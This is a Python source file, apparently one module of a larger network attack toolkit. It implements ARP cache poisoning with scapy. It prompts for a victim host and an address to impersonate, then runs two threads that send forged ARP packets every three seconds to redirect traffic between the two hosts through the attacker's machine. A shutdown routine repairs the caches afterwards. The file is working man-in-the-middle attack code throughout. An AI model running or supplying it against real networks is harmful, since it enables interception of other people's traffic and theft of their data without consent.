import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from threading import Thread
from scapy.all import *
from time import sleep
from util import Error, Msg, debug
from poison import Poison
import config
import gc

class arp(Poison):
	"""ARP spoofing class
	"""

	def __init__(self):
		# keep scapy quiet
		conf.verb = 0
		# addresses
		self.local_mac = get_if_hwaddr(config.get('iface'))
		self.local_ip = ''
		self.to_ip = ''
		self.from_ip = ''
		self.from_mac = None
		self.to_mac = None
		# flag for spoofing 
		self.spoofing = False
		super(arp,self).__init__('ARP Spoof')

	def initialize(self):
		"""Initialize the ARP spoofer
		"""
		try:
			Msg('[!] Using interface [%s:%s]'%(config.get('iface'), self.local_mac))
			# get ip addresses from user
			self.to_ip = raw_input("[!] Enter host to poison:\t")
			self.from_ip = raw_input("[!] Enter address to spoof:\t")
			tmp = raw_input("[!] Spoof IP {0} from victim {1}.  Is this correct? ".format(self.to_ip, self.from_ip))
		except KeyboardInterrupt:
			return None
		except Exception, j:
			debug('Error loading ARP poisoning module: %s'%(j))
			return None
		if "n" in tmp.lower():
			return
		Msg("[!] Initializing ARP poison...")
		return self.initialize_post_spoof()

	def initialize_post_spoof(self):
		""" Separated from mainline initialization so we can run this post-var 
			configuration.  If you're calling this, BE SURE to set up the required
			variables first!
		"""
		try:
			# get mac addresses for both victims
			self.to_mac = getmacbyip(self.to_ip)
			self.from_mac = getmacbyip(self.from_ip)
			# send ARP replies to victim
			debug('Beginning ARP spoof to victim...')
			victim_thread = Thread(target=self.respoofer, args=(self.from_ip, self.to_ip))
			victim_thread.start()
			# send ARP replies to spoofed address
			target_thread = Thread(target=self.respoofer, args=(self.to_ip, self.from_ip))
			target_thread.start()
			self.spoofing = True
		except KeyboardInterrupt:
			Msg('Closing ARP poison down...')
			self.spoofing = False
			return None
		except TypeError, t:
			Error('Type error: %s'%t)
			self.spoofing = False
			return None
		except Exception, j:
			Error('Error with ARP poisoner: %s'%j)
			self.spoofing = False
			return None
		return self.to_ip
			
	def respoofer(self, target, victim):
		""" Respoof the target every three seconds.
		"""
		try:
			target_mac = getmacbyip(target)
			pkt = Ether(dst=target_mac,src=self.local_mac)/ARP(op="who-has",psrc=victim, pdst=target)
			while self.spoofing:
				sendp(pkt, iface_hint=target)
				time.sleep(3)
		except Exception, j:
			Error('Spoofer error: %s'%j)
			return None
	
	def test_stop(self):
		""" Callback for stopping the sniffer
		"""
		if self.spoofing:
			return False
		debug("Stopping spoof threads..")
		return True
	
	def shutdown(self):
		""" Shutdown the ARP spoofer
		"""
		if not self.spoofing: 
			return
		Msg("Initiating ARP shutdown...")
		debug('initiating ARP shutdown')
		self.spoofing = False
		# rectify the ARP caches
		sendp(Ether(dst=self.to_mac,src=self.from_mac)/ARP(op='who-has', 
								psrc=self.from_ip, pdst=self.to_ip),
						inter=1, count=3)
		sendp(Ether(dst=self.from_mac,src=self.to_mac)/ARP(op='who-has', 
								psrc=self.to_ip,pdst=self.from_ip),
						inter=1, count=3)
		debug('ARP shutdown complete.')
		return True
	
	def session_view(self):
		""" Return the IP we're poisoning
		"""
		return self.to_ip

	def view(self):
		""" ARP poisoner doesnt have a view, yet.
		"""
		Msg('No view for ARP poison.  Enable a sniffer for detailed analysis.')
		return
